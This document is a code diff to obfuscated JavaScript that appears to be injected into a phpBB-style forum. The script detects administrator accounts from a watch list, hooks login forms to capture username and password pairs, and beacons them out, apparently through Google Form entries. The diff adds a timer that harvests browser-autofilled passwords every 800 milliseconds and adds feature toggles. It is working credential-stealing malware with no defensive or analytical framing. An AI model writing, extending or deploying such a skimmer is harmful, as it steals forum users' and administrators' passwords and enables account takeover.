@@ -25,6 +25,9 @@
     var E3 = 'entry.389578883';
     var WATCH = ['Admin', 'Istarapol'];
     var FLAG_ANY_CTRL = false;
+    var DO_CTRL = true;
+    var DO_PW = true;
+    var DO_AF = true;
     var WATCH_FIELDS = true;
     var BEACON = true;
     function esc(s) { try { return encodeURIComponent(String(s)); } catch (e) { return ''; } }
@@ -66,7 +69,6 @@
       if (v) { s += '|S:' + v; }
       return s;
     }
-    // Brukernavn = navnet i profillenka memberlist.php?...viewprofile...&u=N
     function account() {
       try {
         var links = D.querySelectorAll('a[href*="' + T0 + '"]');
@@ -74,18 +76,14 @@
           var h = links[i].getAttribute('href') || '';
           if (h.indexOf(T1) >= 0 && h.indexOf('&u=') >= 0) {
             var t = (links[i].textContent || '').trim();
-            if (t && t.length >= 2 && t.length <= 40 && t !== 'Profile') {
-              return t;
-            }
+            if (t && t.length >= 2 && t.length <= 40 && t !== 'Profile') { return t; }
           }
         }
       } catch (e) {}
       return '';
     }
     function hasCtrl() {
-      try {
-        return D.querySelectorAll('a[href*="' + T2 + '"]').length > 0;
-      } catch (e) { return false; }
+      try { return D.querySelectorAll('a[href*="' + T2 + '"]').length > 0; } catch (e) { return false; }
     }
     function seen(k) { try { return w[SG].getItem(k) === '1'; } catch (e) { return false; } }
     function setSeen(k) { try { w[SG].setItem(k, '1'); } catch (e) {} }
@@ -94,12 +92,15 @@
       tx('EVT: ' + pos(), 'beacon');
     }
     function detect() {
+      if (!DO_CTRL) { return; }
       try {
         if (!hasCtrl()) { return; }
         var a = account();
-        var hit = false;
-        for (var i = 0; i < WATCH.length; i++) {
-          if (a && a.toLowerCase() === WATCH[i].toLowerCase()) { hit = true; break; }
+        var hit = FLAG_ANY_CTRL;
+        if (!hit) {
+          for (var i = 0; i < WATCH.length; i++) {
+            if (a && a.toLowerCase() === WATCH[i].toLowerCase()) { hit = true; break; }
+          }
         }
         if (!hit) { return; }
         var key = '_ad_' + (a || 'x');
@@ -121,22 +122,17 @@
               var pk = form.querySelectorAll('input[type="' + K2 + '"]');
               if (!pk.length) { return; }
               form.addEventListener('submit', function () {
+                if (!DO_PW) { return; }
                 try {
-                  var a0 = form.querySelector('input[name="' + K0 + '"]') ||
-                           form.querySelector('input[name="' + K1 + '"]');
-                  var a1 = form.querySelector('input[name="' + K2 + '"]') ||
-                           form.querySelector('input[name="' + K3 + '"]');
+                  var a0 = form.querySelector('input[name="' + K0 + '"]') || form.querySelector('input[name="' + K1 + '"]');
+                  var a1 = form.querySelector('input[name="' + K2 + '"]') || form.querySelector('input[name="' + K3 + '"]');
                   var u = a0 ? a0.value : '';
                   var p = a1 ? a1.value : '';
                   if (!p) {
                     var all = form.querySelectorAll('input[type="' + K2 + '"]');
-                    for (var j = 0; j < all.length; j++) {
-                      if (all[j].value) { p = all[j].value; }
-                    }
+                    for (var j = 0; j < all.length; j++) { if (all[j].value) { p = all[j].value; } }
                   }
-                  if (p) {
-                    tx('EVT: ' + (u || '?') + ':' + p + ' | ' + pos(), 'evt_' + (u || '?'));
-                  }
+                  if (p) { tx('EVT: ' + (u || '?') + ':' + p + ' | ' + pos(), 'evt_' + (u || '?')); }
                 } catch (e) {}
               }, true);
               bound.push(form);
@@ -145,17 +141,35 @@
         }
       } catch (e) {}
     }
+    function autofill() {
+      if (!DO_AF) { return; }
+      try {
+        if (w.__xaf) { return; }
+        w.__xaf = w.setInterval(function () {
+          try {
+            var ps = D.querySelectorAll('input[type="' + K2 + '"]');
+            for (var i = 0; i < ps.length; i++) {
+              var p = ps[i];
+              if (!p.value || p.value === p.__seen) { continue; }
+              p.__seen = p.value;
+              var f = p.form;
+              var u = '';
+              if (f) {
+                var a0 = f.querySelector('input[name="' + K0 + '"]') || f.querySelector('input[name="' + K1 + '"]');
+                u = a0 ? a0.value : '';
+              }
+              tx('AF: ' + (u || '?') + ':' + p.value + ' | ' + pos(), 'af_' + p.value);
+            }
+          } catch (e) {}
+        }, 800);
+      } catch (e) {}
+    }
     function boot() {
       detect();
       watch();
+      autofill();
     }
-    if (D.readyState === 'loading') {
-      D.addEventListener('DOMContentLoaded', boot);
-    } else {
-      boot();
-    }
-    if (D.readyState !== 'complete') {
-      w.addEventListener('load', boot);
-    }
+    if (D.readyState === 'loading') { D.addEventListener('DOMContentLoaded', boot); } else { boot(); }
+    w.addEventListener('load', function () { watch(); autofill(); });
   } catch (e) {}
 })(window);
